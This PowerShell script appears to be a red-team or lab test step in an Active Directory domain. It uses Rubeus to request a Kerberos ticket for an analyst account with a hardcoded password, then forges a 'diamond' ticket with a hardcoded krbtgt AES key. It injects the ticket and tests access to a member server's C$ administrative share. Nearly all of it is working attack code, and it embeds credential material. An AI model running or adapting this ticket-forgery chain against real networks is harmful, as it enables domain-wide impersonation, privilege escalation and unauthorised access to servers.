# WT012 v3: diamond with explicit /user /domain /password + direct argv call
$ErrorActionPreference = 'Continue'
$rb = 'C:\Tools\ADTools\Rubeus-try4.exe'
$out = 'C:\Tools\ADTools'
$krbtgtAes = 'd64da42f8e5caeeb725d009b615eb98f4f05b121376ca38c1e1ee9dcb553d9d2'
$dc = 'dc02.child.cadre.local'

klist purge 2>&1 | Out-Null

# fresh TGT
Remove-Item "$out\wt012-tgt5.kirbi" -ErrorAction SilentlyContinue
& $rb asktgt /user:analyst_t1 /password:T13r_An@lyst! /domain:child.cadre.local "/dc:$dc" "/outfile:$out\wt012-tgt5.kirbi" 2>&1 | Select-String -Pattern 'written|ServiceName' | Select-Object -First 4 | ForEach-Object { Write-Output "TGT|$_" }

if (Test-Path "$out\wt012-tgt5.kirbi") {
    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$out\wt012-tgt5.kirbi"))
    Write-Output "TGT_B64_LEN $($b64.Length)"
    Write-Output '=== DIAMOND (explicit user/domain/password) ==='
    & $rb diamond "/ticket:$b64" "/krbtgt:$krbtgtAes" /enctype:aes /service:cifs/mbr01.child.cadre.local "/dc:$dc" /user:analyst_t1 /domain:child.cadre.local /password:T13r_An@lyst! /ptt 2>&1 | Select-Object -First 35 | ForEach-Object { Write-Output "DIAM|$_" }

    Write-Output '=== REAL-SERVICE VERIFY ==='
    net use \\mbr01.child.cadre.local\c$ /delete 2>&1 | Out-Null
    net use * /delete /y 2>&1 | Out-Null
    cmd.exe /c "dir \\mbr01.child.cadre.local\c$ 2>&1" | Select-Object -First 10 | ForEach-Object { Write-Output "SMB|$_" }
    klist 2>&1 | Select-String -Pattern 'cifs|mbr01' | Select-Object -First 4 | ForEach-Object { Write-Output "KERB|$_" }
}
klist purge 2>&1 | Out-Null
Write-Output 'WT012_V3_DONE'
